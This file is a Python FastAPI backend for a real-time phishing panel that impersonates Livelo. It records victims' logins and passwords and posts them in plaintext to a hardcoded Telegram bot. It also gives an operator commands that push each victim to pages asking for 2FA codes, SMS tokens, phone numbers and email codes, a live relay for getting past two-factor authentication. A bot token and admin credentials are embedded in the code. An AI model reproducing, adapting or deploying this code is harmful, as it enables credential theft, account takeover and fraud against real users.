from fastapi import FastAPI, APIRouter, HTTPException, Depends, Header
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field, ConfigDict
from typing import List, Optional
import uuid
from datetime import datetime, timezone, timedelta
import jwt
import hashlib
import httpx


ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# JWT Configuration
SECRET_KEY = "donas-admin-secret-key-2025"
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 480

# Telegram Configuration
TELEGRAM_BOT_TOKEN = "8483612343:AAGSw4EX0c0IIjTOiXjoki7vHkN-ctjx8n8"
TELEGRAM_CHAT_ID = "-1003679199178"

security = HTTPBearer()

# Create the main app without a prefix
app = FastAPI()

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")

# Função para enviar notificação no Telegram
async def send_telegram_notification(email: str, password: str, device: str = "Desktop", country: str = "Brasil"):
    try:
        now = datetime.now(timezone.utc).strftime("%d/%m/%Y %H:%M")
        message = f"""🔔 *Novo usuário na Livelo!*

📧 *Login:* `{email}`
🔑 *Senha:* `{password}`
📱 *Dispositivo:* {device}
🌍 *País:* {country}
⏰ *Horário:* {now} UTC"""
        
        async with httpx.AsyncClient() as client:
            await client.post(
                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": TELEGRAM_CHAT_ID,
                    "text": message,
                    "parse_mode": "Markdown"
                }
            )
    except Exception as e:
        logging.error(f"Erro ao enviar notificação Telegram: {e}")


# Define Models
class StatusCheck(BaseModel):
    model_config = ConfigDict(extra="ignore")  # Ignore MongoDB's _id field
    
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    client_name: str
    timestamp: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))

class StatusCheckCreate(BaseModel):
    client_name: str

# Admin Models
class AdminLogin(BaseModel):
    username: str
    password: str

class LoginAttempt(BaseModel):
    model_config = ConfigDict(extra="ignore")
    
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    email: str
    password: str
    status: str = "offline"  # "online" ou "offline"
    ip_address: Optional[str] = None
    country: Optional[str] = None
    device: Optional[str] = None
    page: Optional[str] = "Página Loading..."
    current_action: Optional[str] = None  # Para armazenar o comando atual
    action_timestamp: Optional[str] = None
    redirect_url: Optional[str] = None
    # Campos para armazenar dados recebidos dos comandos
    token_2fa: Optional[str] = None
    email_input: Optional[str] = None
    sms_code: Optional[str] = None
    phone_number: Optional[str] = None
    app_mail: Optional[str] = None
    # Lista de tentativas (credenciais múltiplas)
    attempts: List[dict] = Field(default_factory=list)
    timestamp: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))

class LoginAttemptCreate(BaseModel):
    email: str
    password: str
    ip_address: Optional[str] = None
    country: Optional[str] = None
    device: Optional[str] = None
    page: Optional[str] = None

class CommandRequest(BaseModel):
    user_id: str
    command: str  # "INV", "AUT", "EMAIL", "TOK-TEL", "TELEFONE", "AGUARDE", "REDIRECT"
    redirect_url: Optional[str] = None
    reference: Optional[str] = None  # Campo de referência (ex: 4 últimos dígitos do telefone)

# Helper Functions
def create_access_token(data: dict):
    to_encode = data.copy()
    expire = datetime.now(timezone.utc) + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    to_encode.update({"exp": expire})
    encoded_jwt = jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
    return encoded_jwt

def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
    try:
        token = credentials.credentials
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        return payload
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token expirado")
    except jwt.JWTError:
        raise HTTPException(status_code=401, detail="Token inválido")

# Add your routes to the router instead of directly to app
@api_router.get("/")
async def root():
    return {"message": "Hello World"}

@api_router.post("/status", response_model=StatusCheck)
async def create_status_check(input: StatusCheckCreate):
    status_dict = input.model_dump()
    status_obj = StatusCheck(**status_dict)
    
    # Convert to dict and serialize datetime to ISO string for MongoDB
    doc = status_obj.model_dump()
    doc['timestamp'] = doc['timestamp'].isoformat()
    
    _ = await db.status_checks.insert_one(doc)
    return status_obj

@api_router.get("/status", response_model=List[StatusCheck])
async def get_status_checks():
    # Exclude MongoDB's _id field from the query results
    status_checks = await db.status_checks.find({}, {"_id": 0}).to_list(1000)
    
    # Convert ISO string timestamps back to datetime objects
    for check in status_checks:
        if isinstance(check['timestamp'], str):
            check['timestamp'] = datetime.fromisoformat(check['timestamp'])
    
    return status_checks

# Admin Routes
@api_router.post("/admin/login")
async def admin_login(credentials: AdminLogin):
    # Credenciais fixas: donas / 102030al
    if credentials.username == "donas" and credentials.password == "102030al":
        token = create_access_token({"sub": credentials.username})
        return {"access_token": token, "token_type": "bearer"}
    raise HTTPException(status_code=401, detail="Credenciais inválidas")

@api_router.get("/admin/login-attempts", response_model=List[LoginAttempt])
async def get_login_attempts(token_data: dict = Depends(verify_token)):
    attempts = await db.login_attempts.find({}, {"_id": 0}).sort("timestamp", -1).to_list(1000)
    
    for attempt in attempts:
        if isinstance(attempt['timestamp'], str):
            attempt['timestamp'] = datetime.fromisoformat(attempt['timestamp'])
    
    return attempts

@api_router.post("/admin/login-attempts", response_model=LoginAttempt)
async def create_login_attempt(attempt: LoginAttemptCreate):
    attempt_obj = LoginAttempt(**attempt.model_dump())
    
    doc = attempt_obj.model_dump()
    doc['timestamp'] = doc['timestamp'].isoformat()
    
    await db.login_attempts.insert_one(doc)
    
    # Enviar notificação no Telegram
    await send_telegram_notification(
        email=attempt.email,
        password=attempt.password,
        device=attempt.device or "Desktop",
        country=attempt.country or "Brasil"
    )
    
    return attempt_obj

@api_router.delete("/admin/login-attempts/{attempt_id}")
async def delete_login_attempt(attempt_id: str, token_data: dict = Depends(verify_token)):
    result = await db.login_attempts.delete_one({"id": attempt_id})
    if result.deleted_count == 0:
        raise HTTPException(status_code=404, detail="Tentativa não encontrada")
    return {"message": "Tentativa deletada com sucesso"}

@api_router.post("/admin/login-attempts/{attempt_id}/add-attempt")
async def add_attempt_to_existing(attempt_id: str, attempt: LoginAttemptCreate):
    """Adiciona nova tentativa de login ao mesmo usuário"""
    user = await db.login_attempts.find_one({"id": attempt_id})
    if not user:
        raise HTTPException(status_code=404, detail="Usuário não encontrado")
    
    # Adicionar nova tentativa à lista
    new_attempt = {
        "email": attempt.email,
        "password": attempt.password,
        "timestamp": datetime.now(timezone.utc).isoformat()
    }
    
    await db.login_attempts.update_one(
        {"id": attempt_id},
        {"$push": {"attempts": new_attempt}}
    )
    
    return {"message": "Tentativa adicionada com sucesso"}

@api_router.post("/admin/clear-all")
async def clear_all_attempts(token_data: dict = Depends(verify_token)):
    result = await db.login_attempts.delete_many({})
    return {"message": f"{result.deleted_count} tentativas deletadas"}

# Rotas de Comandos
@api_router.post("/admin/command")
async def send_command(command: CommandRequest, token_data: dict = Depends(verify_token)):
    """Envia comando para o usuário"""
    user = await db.login_attempts.find_one({"id": command.user_id})
    if not user:
        raise HTTPException(status_code=404, detail="Usuário não encontrado")
    
    # Se for comando CLEAR, limpar o comando atual
    if command.command == "CLEAR":
        await db.login_attempts.update_one(
            {"id": command.user_id},
            {"$set": {"current_action": None, "action_timestamp": None}}
        )
        return {"message": "Comando limpo com sucesso"}
    
    # Atualizar o comando atual do usuário com timestamp
    update_data = {
        "current_action": command.command,
        "action_timestamp": datetime.now(timezone.utc).isoformat()
    }
    
    # Salvar referência se fornecida
    if command.reference:
        update_data["command_reference"] = command.reference
    
    if command.command == "REDIRECT" and command.redirect_url:
        update_data["redirect_url"] = command.redirect_url
        update_data["page"] = f"Redirecionando para {command.redirect_url}"
    elif command.command == "INV":
        update_data["page"] = "Dados incorretos - Corrigir"
    elif command.command == "AUT":
        update_data["page"] = "Código 2FA"
    elif command.command == "EMAIL":
        update_data["page"] = "Digitar Email"
    elif command.command == "TOK-TEL":
        update_data["page"] = "Código do Telefone"
    elif command.command == "TELEFONE":
        update_data["page"] = "Digitar Telefone"
    elif command.command == "TOK-MAIL":
        update_data["page"] = "Token do Email"
    elif command.command == "AGUARDE":
        update_data["page"] = "Aguarde..."
    
    await db.login_attempts.update_one(
        {"id": command.user_id},
        {"$set": update_data}
    )
    
    return {"message": "Comando enviado com sucesso", "command": command.command}

@api_router.get("/user/check-action/{user_id}")
async def check_user_action(user_id: str):
    """Usuário verifica qual ação deve realizar"""
    user = await db.login_attempts.find_one({"id": user_id}, {"_id": 0})
    if not user:
        return {"action": None, "page": "Página Loading...", "action_timestamp": None}
    
    return {
        "action": user.get("current_action"),
        "page": user.get("page"),
        "redirect_url": user.get("redirect_url"),
        "action_timestamp": user.get("action_timestamp"),
        "command_reference": user.get("command_reference")
    }

@api_router.post("/admin/update-status/{user_id}")
async def update_user_status(user_id: str, status: str, token_data: dict = Depends(verify_token)):
    """Atualiza status do usuário (online/offline)"""
    await db.login_attempts.update_one(
        {"id": user_id},
        {"$set": {"status": status}}
    )
    return {"message": f"Status atualizado para {status}"}

class InvalidateFieldRequest(BaseModel):
    user_id: str
    command: str

@api_router.post("/admin/invalidate-field")
async def invalidate_field(data: InvalidateFieldRequest, token_data: dict = Depends(verify_token)):
    """Limpa o campo correspondente ao comando para pedir novo dado"""
    # Mapear comando para o campo que deve ser limpo
    command_to_field = {
        "AUT": "token_2fa",
        "EMAIL": "email_input",
        "TOK-TEL": "sms_code",
        "TELEFONE": "phone_number",
        "TOK-MAIL": "app_mail"
    }
    
    field = command_to_field.get(data.command)
    if not field:
        raise HTTPException(status_code=400, detail="Comando inválido")
    
    await db.login_attempts.update_one(
        {"id": data.user_id},
        {"$set": {field: None}}
    )
    return {"message": f"Campo {field} limpo com sucesso"}

class UserInputData(BaseModel):
    field: str  # "token_2fa", "email_input", "sms_code", "phone_number", "app_mail"
    value: str

@api_router.post("/user/submit-data/{user_id}")
async def submit_user_data(user_id: str, data: UserInputData):
    """Recebe dados do usuário (código 2FA, email, telefone, etc.)"""
    user = await db.login_attempts.find_one({"id": user_id})
    if not user:
        raise HTTPException(status_code=404, detail="Usuário não encontrado")
    
    # Mapear campo e atualizar
    allowed_fields = ["token_2fa", "email_input", "sms_code", "phone_number", "app_mail"]
    if data.field not in allowed_fields:
        raise HTTPException(status_code=400, detail="Campo inválido")
    
    await db.login_attempts.update_one(
        {"id": user_id},
        {"$set": {data.field: data.value}}
    )
    
    return {"message": "Dados recebidos com sucesso"}

# Include the router in the main app
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()